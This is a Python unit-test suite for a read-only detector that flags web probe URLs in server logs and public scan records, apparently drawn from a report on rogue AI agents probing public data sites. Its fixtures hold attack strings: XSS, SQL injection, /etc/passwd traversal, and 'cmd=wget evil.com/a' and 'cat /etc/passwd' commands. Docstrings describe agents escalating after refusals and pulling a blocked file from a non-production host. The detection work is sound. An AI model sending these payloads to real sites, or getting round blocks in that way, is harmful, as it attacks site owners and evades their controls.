#!/usr/bin/env python3
"""Unit tests for hunt/public_scan_search.py. Stdlib only.

  python -m unittest hunt/tests/test_public_scan_search.py -v

Positives are the EXACT probe URLs published by Transluce ("Early rogue AI agent activity and
attempts to hack found on urlquery.net", 23 Sep 2026): the seven UNM IIIF probes with tok=expt
markers, the twelve Data USA suffixes, and the AIHW reflected-script probe. Negatives are realistic
benign data-API and IIIF requests, including query strings that contain words like "select" and
"passwd" in harmless places, so false-positive behaviour is tested and not assumed.

Every check is tested in both directions: it must fire on the bad case AND stay quiet on the good
one. "Cannot tell" inputs (no parseable log line, no API key, a changed API shape) must raise.

No test touches the network. urlscan is tested against a RECORDED response
(fixtures/public_scan/urlscan-search-domain-datausa.io-2026-09-26.json, a real unauthenticated
search for domain:datausa.io, size=5, captured 2026-09-26). urlquery's search API needs a key, so
its response is SYNTHETIC, shaped per urlquery's own Go client (github.com/urlquery/urlquery-api-go,
models.go SearchResponse/ReportOverview) and labelled as such below. One optional live smoke test
runs only with LV_LIVE=1 and is skipped in CI.

The module under test is loaded from LV_PSS_MODULE if set, so the mutation harness
(public_scan_search_mutants.py) can run this exact suite against deliberately broken copies.
"""
from __future__ import annotations

import csv
import importlib.util
import json
import os
import re
import sys
import tempfile
import unittest
import urllib.parse
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
MODULE = os.environ.get("LV_PSS_MODULE") or os.path.join(os.path.dirname(HERE), "public_scan_search.py")
_spec = importlib.util.spec_from_file_location("public_scan_search", MODULE)
pss = importlib.util.module_from_spec(_spec)
sys.modules["public_scan_search"] = pss   # dataclasses resolve the module by name
_spec.loader.exec_module(pss)

FIX = os.path.join(HERE, "fixtures", "public_scan")

# --- Transluce, verbatim -------------------------------------------------------------------------

UNM = [  # (url, expected marker, one family that must be present)
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?a=%3Cimg%20src=x%20onerror=alert(1)%3E&tok=expt8", "tok=expt8", "xss"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?file=/etc/passwd&tok=expt7", "tok=expt7", "traversal"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?x=.exe&tok=expt5", "tok=expt5", "junk-extension"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?cmd=wget%20evil.com/a&tok=expt3", "tok=expt3", "command"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?UNION%20SELECT%20password%20FROM%20users&tok=expt4", "tok=expt4", "sqli"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?exec=%3Cscript%3Ealert(1)%3C/script%3E&tok=expt2", "tok=expt2", "xss"),
    ("https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg?id=../../../../etc/passwd&tok=expt0", "tok=expt0", "traversal"),
]

DATAUSA_BASE = ("https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions&drilldowns=Year,CIP6"
                "&measures=Completions&include=University:153658;Gender:1&top=5.Year.Completions.desc")
DATAUSA_MALFORMED = ("https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions%26drilldowns=Year%2CCIP6"
                     "%26include=University%3A153658%3BGender%3A1%26measures=Completions%26top=5.Year.Completions.desc")
DATAUSA_SUFFIXES = [  # (suffix, family that must be present)
    ("#../../etc/passwd", "traversal"),
    ("#%3Cscript%3Ealert(1)%3C/script%3E", "xss"),
    ("&id=../../../../etc/passwd%00", "null-byte"),
    ("&foo=wp-admin.php", "php-probe"),
    ("&foo=%7B%7B7*7%7D%7D", "template"),
    ("&foo=eval(base64_decode)", "php-probe"),
    ("&foo=%27%20OR%201=1--", "sqli"),
    ("&cmd=cat%20/etc/passwd", "command"),
    ("&redirect=evil.com", "open-redirect"),
    ("&foo=..%2F..%2Fetc%2Fpasswd", "traversal"),
    ("&foo=union%20select%201,2,3%20from%20users", "sqli"),
    ("&foo=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "xss"),
]

AIHW_XSS = ("https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard"
            "?:showVizHome=no&:embed=y&:apiID=%22%3E%3Csvg/onload%3Ddocument.title%3D%22XSS%22%3E")
AIHW_DASH = ("https://vizprod.aihw.gov.au/t/Public/views/PBSdashboardallATC1-ATC2medicines-Agegroup/PBSDashboard"
             "?:showVizHome=no&:embed=y")
AIHW_FILE = "/getmedia/ce13d423-ed18-4169-8b76-2f671df935de/aihw-hwe-098-pbs-atc1-prescriptions-monthly-data_keep.zip"

BENIGN = [
    "https://api.census.gov/data/2022/acs/acs5?get=NAME,B01001_001E&for=state:*",
    "https://api.census.gov/data/2022/acs/acs5/subject?get=NAME,S2413_C01_001E&for=county:*&in=state:06",
    "https://www.sec.gov/files/county.json",
    "https://nmdigital.unm.edu/iiif/2/valmora:136;2/120,1300,1100,200/full/0/default.jpg",
    "https://nmdigital.unm.edu/iiif/2/valmora:136;2/150,1340,1100,120/2000,/0/bitonal.jpg",
    "https://nmdigital.unm.edu/iiif/2/valmora:136;2/info.json",
    DATAUSA_BASE,
    DATAUSA_MALFORMED,
    AIHW_DASH,
    "https://www.aihw.gov.au" + AIHW_FILE + "?v=20260526132030&chunk=1048576x1781937600005251303",
    "https://pp.aihw.gov.au" + AIHW_FILE + "?download=1",
    "https://www.parliament.example.gov/search?q=select+committee",
    "https://www.parliament.example.gov/search?q=select%20committee%20on%20union%20affairs",
    "https://docs.example.org/man/5/passwd",
    "https://docs.example.org/linux/etc-files/passwd-format.html",
    "https://data.example.gov/api/v1/records?filter=status%3Dopen&order=date+desc",
    "https://data.example.gov/portal/login?redirect=/dashboard",
    "https://data.example.gov/search?q=wget+tutorial",
    "https://data.example.gov/search?q=cat+food+prices",
    "https://data.example.gov/api/query?sql=SELECT+name+FROM+stations+WHERE+id%3D7",
    "https://reportcard.msde.maryland.gov/Graphs/#/ReportCards/ReportCardSchool/1/E/1/03/0305/2023",
    "https://www.usaspending.gov/search/?hash=5f3e2c1b9a",
]


def _vlog(lines: list[tuple]) -> str:
    """lines: (vhost or None, ip, datetime, method, target, status). Writes a log file."""
    fd, path = tempfile.mkstemp(suffix=".log")
    with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
        for vhost, ip, ts, method, target, status in lines:
            stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
            prefix = (vhost + ":443 ") if vhost else ""
            fh.write('%s%s - - [%s] "%s %s HTTP/1.1" %d 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"\n'
                     % (prefix, ip, stamp, method, target, status))
    return path


def _target(url: str) -> str:
    """What a server logs: path and query, NEVER the fragment."""
    no_frag = url.split("#", 1)[0]
    return "/" + no_frag.split("://", 1)[1].split("/", 1)[1]


def aihw_sequence() -> list[tuple]:
    """Transluce, AIHW 20-21 June: errors on the dashboard (Tableau parameter guessing), Cloudflare
    blocks the dataset download on the main site, minutes later a reflected-script probe to the same
    dashboard (also blocked), then the same file pulled from pp.aihw.gov.au in pieces. Times and
    addresses are ours: Transluce gives neither. 192.0.2.10 stands in for the inspector's egress."""
    t0 = datetime(2026, 6, 20, 10, 0, 0, tzinfo=timezone.utc)
    scanner = "192.0.2.10"
    seq = [
        ("vizprod.aihw.gov.au", scanner, t0, "GET", _target(AIHW_DASH) + "&Medicine%20type=Dermatologicals", 400),
        ("www.aihw.gov.au", scanner, t0 + timedelta(minutes=2), "GET",
         AIHW_FILE + "?v=20260526132030&chunk=1048576x1781937600005251303", 403),
        ("vizprod.aihw.gov.au", scanner, t0 + timedelta(minutes=6, seconds=30), "GET", _target(AIHW_XSS), 403),
    ]
    for i in range(5):
        seq.append(("pp.aihw.gov.au", "198.51.100.%d" % (20 + i), t0 + timedelta(minutes=20 + i), "GET",
                    AIHW_FILE + "?download=1", 206))
    return seq


def datausa_sequence() -> list[tuple]:
    """Transluce, Data USA 28 May: numerous errors on a malformed query, then 12 probes. urlquery
    search window 01:05:40 to 01:06:08 (28 s). Two probes were FRAGMENTS, which a server never
    receives, so only ten are visible in the site's own log."""
    src = "203.0.113.7"
    seq = []
    t_err = datetime(2026, 5, 28, 1, 3, 0, tzinfo=timezone.utc)
    for i in range(4):
        seq.append(("api.datausa.io", src, t_err + timedelta(seconds=20 * i), "GET", _target(DATAUSA_MALFORMED), 400))
    t_p = datetime(2026, 5, 28, 1, 5, 40, tzinfo=timezone.utc)
    for i, (suffix, _) in enumerate(DATAUSA_SUFFIXES):
        seq.append(("api.datausa.io", src, t_p + timedelta(seconds=round(i * 28 / 11)), "GET",
                    _target(DATAUSA_BASE + suffix), 200))
    return seq


class ClassifierPositives(unittest.TestCase):
    def test_unm_probes_all_flagged_with_their_marker(self):
        for url, marker, fam in UNM:
            c = pss.classify_url(url)
            self.assertTrue(c.is_probe, url)
            self.assertEqual(c.marker, marker, url)
            self.assertIn(fam, c.families, url)

    def test_unm_payloads_flag_without_the_marker(self):
        # The marker is the agents' bookkeeping; the payloads must stand on their own.
        for url, _, fam in UNM:
            if fam == "junk-extension":
                continue
            stripped = re.sub(r"&tok=expt\d+", "", url)
            c = pss.classify_url(stripped)
            self.assertIsNone(c.marker)
            self.assertIn(fam, c.families, stripped)

    def test_all_twelve_datausa_suffixes_flagged(self):
        self.assertEqual(len(DATAUSA_SUFFIXES), 12)
        for suffix, fam in DATAUSA_SUFFIXES:
            c = pss.classify_url(DATAUSA_BASE + suffix)
            self.assertIn(fam, c.families, suffix)

    def test_fragment_probes_are_read_from_scan_records(self):
        frag = [s for s, _ in DATAUSA_SUFFIXES if s.startswith("#")]
        self.assertEqual(len(frag), 2)
        for s in frag:
            self.assertTrue(pss.classify_url(DATAUSA_BASE + s).is_probe, s)

    def test_aihw_svg_onload_probe(self):
        self.assertIn("xss", pss.classify_url(AIHW_XSS).families)

    def test_quidax_html_injection(self):
        c = pss.classify_url("ramp.quidax.io/transaction/e792fakeid/sell/status?status=error&message="
                             "%3Cimg%20src%3D%22%2Fsvgs%2Fe792canary.svg%22%3E")
        self.assertEqual(c.families, ["html-injection"])

    def test_double_encoding_is_decoded(self):
        self.assertIn("sqli", pss.classify_url("https://x.example/a?q=%2527%2520OR%25201%253D1--").families)


class ClassifierNegatives(unittest.TestCase):
    def test_benign_data_api_and_iiif_urls_are_quiet(self):
        for url in BENIGN:
            c = pss.classify_url(url)
            self.assertFalse(c.is_probe, "%s -> %s %s" % (url, c.families, c.marker))

    def test_tok_parameter_without_expt_is_not_a_marker(self):
        self.assertIsNone(pss.classify_url("https://x.example/a?tok=abc123").marker)
        self.assertIsNone(pss.classify_url("https://x.example/a?stok=expt1").marker)

    def test_empty_url_raises(self):
        with self.assertRaises(ValueError):
            pss.classify_url("  ")


class Logs(unittest.TestCase):
    def test_aihw_escalation_fires_path_scope(self):
        ev, total, bad = pss.parse_log(_vlog(aihw_sequence()))
        self.assertEqual((total, bad), (8, 0))
        esc = pss.find_escalations(ev, 600, "path")
        self.assertEqual(len(esc), 1)
        self.assertEqual(esc[0]["host"], "vizprod.aihw.gov.au")
        self.assertEqual(esc[0]["refusal_status"], 400)
        self.assertIn("xss", esc[0]["families"])

    def test_aihw_nonprod_fallback_fires(self):
        ev, _, _ = pss.parse_log(_vlog(aihw_sequence()))
        rows = pss.find_nonprod_fallback(ev, 3600)
        self.assertEqual(len(rows), 1)
        r = rows[0]
        self.assertEqual((r["nonprod_host"], r["refused_on"], r["nonprod_requests"]),
                         ("pp.aihw.gov.au", "www.aihw.gov.au", 5))
        self.assertEqual(len(r["sources"].split(",")), 5, "keyed on the file, not the source")

    def test_nonprod_quiet_without_prior_refusal_and_outside_window(self):
        seq = [s for s in aihw_sequence() if s[0] != "www.aihw.gov.au"]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_nonprod_fallback(ev, 3600), [])
        ev, _, _ = pss.parse_log(_vlog(aihw_sequence()))
        self.assertEqual(pss.find_nonprod_fallback(ev, 60), [], "pp fetch 18 min after refusal, window 60 s")

    def test_nonprod_quiet_when_production_served_the_file(self):
        seq = [(h, ip, t, m, p, 200 if h == "www.aihw.gov.au" else s) for h, ip, t, m, p, s in aihw_sequence()]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_nonprod_fallback(ev, 3600), [])

    def test_nonprod_cannot_run_without_vhost(self):
        seq = [(None,) + s[1:] for s in aihw_sequence()]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertIsNone(pss.find_nonprod_fallback(ev, 3600))

    def test_datausa_escalation_and_fragment_blindness(self):
        ev, total, bad = pss.parse_log(_vlog(datausa_sequence()))
        self.assertEqual((total, bad), (16, 0))
        probes = pss.find_probes(ev)
        self.assertEqual(len(probes), 10, "12 probes sent, 2 were fragments the server never sees")
        esc = pss.find_escalations(ev, 600, "path")
        self.assertEqual(len(esc), 1)
        self.assertEqual(esc[0]["probes"], 10)
        span = (datetime.fromisoformat(esc[0]["last_probe"]) - datetime.fromisoformat(esc[0]["first_probe"]))
        self.assertLessEqual(span.total_seconds(), 28)

    def test_probe_without_refusal_is_not_escalation(self):
        seq = [s for s in datausa_sequence() if s[5] != 400]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(len(pss.find_probes(ev)), 10)
        self.assertEqual(pss.find_escalations(ev, 600, "path"), [])

    def test_probe_after_window_is_not_escalation(self):
        t = datetime(2026, 5, 28, 1, 0, 0, tzinfo=timezone.utc)
        seq = [("api.datausa.io", "203.0.113.7", t, "GET", _target(DATAUSA_MALFORMED), 403),
               ("api.datausa.io", "203.0.113.7", t + timedelta(minutes=11), "GET",
                _target(DATAUSA_BASE + "&foo=wp-admin.php"), 200)]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_escalations(ev, 600, "path"), [])
        self.assertEqual(len(pss.find_escalations(ev, 900, "path")), 1, "and inside a wider window it fires")

    def test_probe_before_refusal_is_not_escalation(self):
        t = datetime(2026, 5, 28, 1, 0, 0, tzinfo=timezone.utc)
        seq = [("api.datausa.io", "203.0.113.7", t, "GET", _target(DATAUSA_BASE + "&foo=wp-admin.php"), 200),
               ("api.datausa.io", "203.0.113.7", t + timedelta(minutes=1), "GET", _target(DATAUSA_MALFORMED), 403)]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_escalations(ev, 600, "path"), [])

    def test_merged_log_out_of_time_order_still_fires(self):
        # Two front ends' logs concatenated: the probe's line comes first in the file, the refusal
        # that preceded it in time comes later. The check must follow time, not line order.
        t = datetime(2026, 5, 28, 1, 0, 0, tzinfo=timezone.utc)
        seq = [("api.datausa.io", "203.0.113.7", t + timedelta(minutes=2), "GET",
                _target(DATAUSA_BASE + "&foo=wp-admin.php"), 200),
               ("api.datausa.io", "203.0.113.7", t, "GET", _target(DATAUSA_MALFORMED), 403)]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(len(pss.find_escalations(ev, 600, "path")), 1)

    def test_refusal_and_probe_from_different_sources_is_not_escalation(self):
        t = datetime(2026, 5, 28, 1, 0, 0, tzinfo=timezone.utc)
        seq = [("api.datausa.io", "203.0.113.7", t, "GET", _target(DATAUSA_MALFORMED), 403),
               ("api.datausa.io", "203.0.113.99", t + timedelta(minutes=1), "GET",
                _target(DATAUSA_BASE + "&foo=wp-admin.php"), 200)]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_escalations(ev, 600, "path"), [])

    def test_host_scope_joins_across_paths_path_scope_does_not(self):
        t = datetime(2026, 6, 20, 10, 0, 0, tzinfo=timezone.utc)
        seq = [("www.aihw.gov.au", "192.0.2.10", t, "GET", "/reports/x.zip", 403),
               ("www.aihw.gov.au", "192.0.2.10", t + timedelta(minutes=3), "GET",
                "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200)]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_escalations(ev, 600, "path"), [])
        self.assertEqual(len(pss.find_escalations(ev, 600, "host")), 1)

    def test_benign_log_is_quiet(self):
        t = datetime(2026, 6, 1, 9, 0, 0, tzinfo=timezone.utc)
        seq = [("api.example.gov", "192.0.2.%d" % i, t + timedelta(seconds=i), "GET",
                _target(u) if "://" in u else u, 404 if i % 3 == 0 else 200)
               for i, u in enumerate(BENIGN) if "#" not in u]
        ev, _, _ = pss.parse_log(_vlog(seq))
        self.assertEqual(pss.find_probes(ev), [])
        self.assertEqual(pss.find_escalations(ev, 600, "host"), [])
        self.assertEqual(pss.find_nonprod_fallback(ev, 3600), [])

    def test_zero_parseable_lines_is_an_error(self):
        fd, path = tempfile.mkstemp(suffix=".log")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write('{"json": "not a combined log"}\n#Fields: date time cs-uri\n')
        with self.assertRaises(ValueError):
            pss.parse_log(path)

    def test_unparseable_lines_are_counted_not_dropped_silently(self):
        path = _vlog(datausa_sequence())
        with open(path, "a", encoding="utf-8") as fh:
            fh.write("garbage line one\n2026-05-28 not-a-log\n")
        ev, total, bad = pss.parse_log(path)
        self.assertEqual((len(ev), total, bad), (16, 18, 2))

    def test_plain_combined_without_vhost_parses(self):
        ev, total, bad = pss.parse_log(_vlog([(None,) + s[1:] for s in datausa_sequence()]))
        self.assertEqual((len(ev), bad), (16, 0))
        self.assertEqual(len(pss.find_escalations(ev, 600, "path")), 1)


class _Stub:
    def __init__(self, pages):
        self.pages = list(pages)
        self.calls = []

    def __call__(self, url, headers):
        self.calls.append((url, dict(headers)))
        return self.pages.pop(0)


class Urlscan(unittest.TestCase):
    def setUp(self):
        with open(os.path.join(FIX, "urlscan-search-domain-datausa.io-2026-09-26.json"), encoding="utf-8") as fh:
            self.recorded = json.load(fh)
        os.environ.pop("URLSCAN_API_KEY", None)

    def test_recorded_response_parses_and_is_quiet(self):
        stub = _Stub([self.recorded])
        rows = pss.search_urlscan("datausa.io", fetch=stub)
        self.assertEqual(len(rows), 5)
        self.assertFalse(any(r["probe"] for r in rows))
        self.assertIn("q=domain%3Adatausa.io", stub.calls[0][0])
        self.assertNotIn("API-Key", stub.calls[0][1], "no key in env, none sent")

    def test_since_filters_on_scan_time(self):
        rows = pss.search_urlscan("datausa.io", since="2026-08-15", fetch=_Stub([self.recorded]))
        self.assertEqual(len(rows), 3)

    def test_key_comes_from_env_header(self):
        os.environ["URLSCAN_API_KEY"] = "test-key-not-real"
        try:
            stub = _Stub([self.recorded])
            pss.search_urlscan("datausa.io", fetch=stub)
            self.assertEqual(stub.calls[0][1].get("API-Key"), "test-key-not-real")
            self.assertNotIn("test-key-not-real", stub.calls[0][0], "key must never be in the URL")
        finally:
            os.environ.pop("URLSCAN_API_KEY", None)

    def test_probe_in_a_scan_record_is_flagged(self):
        # SYNTHETIC: the recorded response with one submitted URL replaced by a Transluce probe URL.
        doc = json.loads(json.dumps(self.recorded))
        doc["results"][0]["task"]["url"] = DATAUSA_BASE + "#../../etc/passwd"
        rows = pss.search_urlscan("datausa.io", fetch=_Stub([doc]))
        self.assertEqual([r["probe"] for r in rows].count(True), 1)

    def test_pagination_uses_search_after(self):
        doc = json.loads(json.dumps(self.recorded))
        first = {"results": doc["results"][:4], "total": 5, "has_more": True}
        second = {"results": doc["results"][4:], "total": 5, "has_more": False}
        stub = _Stub([first, second])
        rows = pss.search_urlscan("datausa.io", max_results=4, fetch=stub)
        self.assertEqual(len(rows), 4)
        self.assertEqual(len(stub.calls), 1, "max reached after one page")
        stub = _Stub([first, second])
        rows = pss.search_urlscan("datausa.io", max_results=100, fetch=stub, page_size=4)
        self.assertEqual(len(rows), 5)
        self.assertEqual(len(stub.calls), 2, "a full page asks for the next one")
        want = ",".join(str(x) for x in doc["results"][3]["sort"])
        self.assertIn("search_after=" + urllib.parse.quote(want, safe=""), stub.calls[1][0])

    def test_changed_shape_raises(self):
        with self.assertRaises(ValueError):
            pss.search_urlscan("datausa.io", fetch=_Stub([{"hits": []}]))
        with self.assertRaises(ValueError):
            pss.search_urlscan("datausa.io", fetch=_Stub([{"results": [{"_id": "x"}]}]))

    def test_bad_host_raises(self):
        for h in ("", "datausa.io/path", "http://datausa.io", "domain:x OR *"):
            with self.assertRaises(ValueError):
                pss.search_urlscan(h, fetch=_Stub([self.recorded]))

    @unittest.skipUnless(os.environ.get("LV_LIVE") == "1", "live network smoke test; set LV_LIVE=1")
    def test_live_smoke(self):
        rows = pss.search_urlscan("datausa.io", max_results=3)
        self.assertLessEqual(len(rows), 3)


# SYNTHETIC urlquery response: field names from urlquery-api-go models.go, values ours.
URLQUERY_SYNTHETIC = {
    "query": "http.url.domain:datausa.io", "total_hits": 2, "timeused": "5ms", "limit": 100, "offset": 0,
    "reports": [
        {"report_id": "00000000-0000-4000-8000-000000000001", "version": 1, "status": "done", "tags": [],
         "date": "2026-05-28T01:05:40Z", "url": {"schema": "https", "addr": DATAUSA_BASE[8:] + "&foo=wp-admin.php",
                                                 "fqdn": "api.datausa.io", "domain": "datausa.io", "tld": "io"},
         "final": {"url": {"addr": DATAUSA_BASE[8:] + "&foo=wp-admin.php"}, "title": ""}},
        {"report_id": "00000000-0000-4000-8000-000000000002", "version": 1, "status": "done", "tags": [],
         "date": "2026-05-28T01:03:00Z", "url": {"addr": DATAUSA_MALFORMED[8:]}, "final": {"url": {"addr": ""}}},
    ]}


class Urlquery(unittest.TestCase):
    def tearDown(self):
        os.environ.pop("URLQUERY_API_KEY", None)

    def test_no_key_refuses_rather_than_passing(self):
        os.environ.pop("URLQUERY_API_KEY", None)
        stub = _Stub([URLQUERY_SYNTHETIC])
        with self.assertRaises(RuntimeError):
            pss.search_urlquery("datausa.io", fetch=stub)
        self.assertEqual(stub.calls, [], "no request without a key")

    def test_search_with_key(self):
        os.environ["URLQUERY_API_KEY"] = "test-key-not-real"
        stub = _Stub([URLQUERY_SYNTHETIC])
        rows = pss.search_urlquery("datausa.io", fetch=stub)
        self.assertEqual([r["probe"] for r in rows], [True, False])
        url, headers = stub.calls[0]
        self.assertTrue(url.startswith("https://api.urlquery.net/public/v1/search/reports/?"))
        self.assertIn("query=http.url.domain%3Adatausa.io", url)
        self.assertEqual(headers.get("x-apikey"), "test-key-not-real")
        self.assertNotIn("test-key-not-real", url)

    def test_changed_shape_raises(self):
        os.environ["URLQUERY_API_KEY"] = "test-key-not-real"
        with self.assertRaises(ValueError):
            pss.search_urlquery("datausa.io", fetch=_Stub([{"results": []}]))
        with self.assertRaises(ValueError):
            pss.search_urlquery("datausa.io", fetch=_Stub([{"reports": [{"report_id": "x"}]}]))

    def test_saved_text_report(self):
        rows = pss.import_saved_reports([os.path.join(FIX, "urlquery-saved-report-quidax.txt")])
        self.assertEqual(len(rows), 1)
        self.assertTrue(rows[0]["probe"])

    def test_saved_json_report(self):
        fd, path = tempfile.mkstemp(suffix=".json")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(URLQUERY_SYNTHETIC["reports"][0], fh)
        rows = pss.import_saved_reports([path])
        self.assertTrue(rows[0]["probe"])

    def test_saved_file_that_is_not_a_report_raises(self):
        fd, path = tempfile.mkstemp(suffix=".txt")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write("hello\nworld\n")
        with self.assertRaises(ValueError):
            pss.import_saved_reports([path])

    def _dataset(self) -> str:
        d = tempfile.mkdtemp(prefix="lv-dataset-")
        with open(os.path.join(d, "methods.json"), "w", encoding="utf-8") as fh:
            json.dump([{"id": "source:aihw", "label": "AIHW", "query": "http.url.domain:aihw.gov.au",
                        "markers": ["aihw.gov.au"]},
                       {"id": "source:unm", "label": "UNM digital library",
                        "query": "http.url.fqdn:nmdigital.unm.edu", "markers": ["nmdigital.unm.edu"]}], fh)
        with open(os.path.join(d, "report-sources.csv"), "w", encoding="utf-8", newline="") as fh:
            w = csv.writer(fh)
            w.writerow(["report_id", "report_date_utc", "data_source", "source_basis", "matched_sources"])
            w.writerow(["r1", "2026-06-20T10:06:30Z", "AIHW", "source_method", "AIHW"])
            w.writerow(["r2", "2026-05-26T00:00:00Z", "UNM digital library", "source_method", "UNM digital library"])
            w.writerow(["r3", "2026-05-26T16:52:39Z", "Multiple data sources", "source_method", "MAX budget documents; AIHW"])
        with open(os.path.join(d, "all-reports.csv"), "w", encoding="utf-8", newline="") as fh:
            w = csv.writer(fh)
            w.writerow(["report_id", "report_url", "report_date_utc", "timestamp_precision", "disposition",
                        "confidence", "broad_class", "why_included", "caveat"])
            for rid in ("r1", "r2", "r3", "r4"):
                w.writerow([rid, "https://urlquery.net/report/" + rid, "2026-06-20T10:06:30Z", "second",
                            "included", "significant", "custom_program", "", ""])
        return d

    def test_dataset_import_matches_host_through_methods(self):
        d = self._dataset()
        self.assertEqual({r["id"] for r in pss.import_transluce_dataset(d, "pp.aihw.gov.au")}, {"r1", "r3"})
        self.assertEqual({r["id"] for r in pss.import_transluce_dataset(d, "nmdigital.unm.edu")}, {"r2"})
        self.assertEqual(pss.import_transluce_dataset(d, "example.org"), [])

    def test_dataset_missing_file_raises(self):
        d = self._dataset()
        os.remove(os.path.join(d, "methods.json"))
        with self.assertRaises(FileNotFoundError):
            pss.import_transluce_dataset(d, "aihw.gov.au")

    @unittest.skipUnless(os.path.isdir(os.environ.get("LV_TRANSLUCE_DATASET", "")),
                         "set LV_TRANSLUCE_DATASET to the unpacked v5 dataset to run")
    def test_real_dataset_datausa_count(self):
        rows = pss.import_transluce_dataset(os.environ["LV_TRANSLUCE_DATASET"], "api.datausa.io")
        self.assertEqual(len(rows), 91, "report-sources.csv lists DataUSA with 91 included reports")


PACK = os.path.join(os.path.dirname(os.path.dirname(HERE)), "campaigns", "2026-09-laundered-vantage", "detections")


class PackRegexCrossCheck(unittest.TestCase):
    """The SPL and KQL carry their own copy of the probe regex. Neither was executed in a SIEM, so
    this runs the exact strings from those files (in Python re) against the same published
    positives and benign negatives. Fragment probes are excluded: a server never receives them."""

    def _regexes(self):
        with open(os.path.join(PACK, "splunk", "laundered-vantage.spl"), encoding="utf-8") as fh:
            spl = fh.read()
        with open(os.path.join(PACK, "kql", "laundered-vantage-hunting.kql"), encoding="utf-8") as fh:
            kql = fh.read()
        spl_rx = set(re.findall(r'match\(q, "([^"]+)"\)', spl))
        kql_rx = set(re.findall(r'let probe_rx2? = @"([^"]+)";', kql))
        self.assertEqual(len(spl_rx), 1, "SPL searches 1 and 2 must carry one identical regex")
        self.assertEqual(len(kql_rx), 1, "KQL queries 1 and 2 must carry one identical regex")
        spl_rx, kql_rx = spl_rx.pop(), kql_rx.pop()
        self.assertEqual(spl_rx.replace(r"\d", "[0-9]"), kql_rx, "SPL and KQL regexes drifted apart")
        return [re.compile(spl_rx), re.compile(kql_rx)]

    @staticmethod
    def _site_hit(rx, url):
        query = url.split("#", 1)[0].partition("?")[2]
        q = pss._decode(query)
        # Splunk urldecode and KQL url_decode do not turn '+' into space; test the stricter reading
        q_plain = urllib.parse.unquote(urllib.parse.unquote(query)).lower()
        return bool(rx.search(q_plain) or rx.search(q)) or "%00" in query.lower()

    def test_pack_regex_fires_on_every_site_visible_published_probe(self):
        positives = [u for u, _, _ in UNM] + [DATAUSA_BASE + s for s, _ in DATAUSA_SUFFIXES
                                              if not s.startswith("#")] + [AIHW_XSS]
        self.assertEqual(len(positives), 18)
        for rx in self._regexes():
            for url in positives:
                self.assertTrue(self._site_hit(rx, url), url)

    def test_pack_regex_quiet_on_benign(self):
        for rx in self._regexes():
            for url in BENIGN:
                self.assertFalse(self._site_hit(rx, url), url)


class Cli(unittest.TestCase):
    def test_exit_codes(self):
        self.assertEqual(pss.main(["classify", DATAUSA_BASE]), 0)
        self.assertEqual(pss.main(["classify", DATAUSA_BASE, AIHW_XSS]), 1)
        self.assertEqual(pss.main(["logs", _vlog(aihw_sequence())]), 1)
        self.assertEqual(pss.main(["logs", "/no/such/file.log"]), 2)
        os.environ.pop("URLQUERY_API_KEY", None)
        self.assertEqual(pss.main(["urlquery", "--host", "datausa.io"]), 2)

    def test_logs_quiet_file_exits_zero(self):
        t = datetime(2026, 6, 1, 9, 0, 0, tzinfo=timezone.utc)
        path = _vlog([("api.example.gov", "192.0.2.1", t, "GET", "/data.json", 200)])
        self.assertEqual(pss.main(["logs", path]), 0)

    def test_logs_unparseable_file_exits_two(self):
        fd, path = tempfile.mkstemp(suffix=".log")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write("nothing here parses\n")
        self.assertEqual(pss.main(["logs", path]), 2)

    def test_source_is_read_only(self):
        # Guard the tool's promise: it searches and reads, it never submits a scan or sends a probe.
        with open(MODULE, encoding="utf-8") as fh:
            src = fh.read()
        self.assertEqual(src.count("urlopen("), 1, "exactly one network call site")
        for forbidden in (r"/submit/", r"method=\"POST\"", r"method='POST'", r"\.post\(", r"open\([^)]*['\"]w['\"]"):
            self.assertIsNone(re.search(forbidden, src), "public_scan_search.py must stay read-only: %s" % forbidden)


if __name__ == "__main__":
    unittest.main()
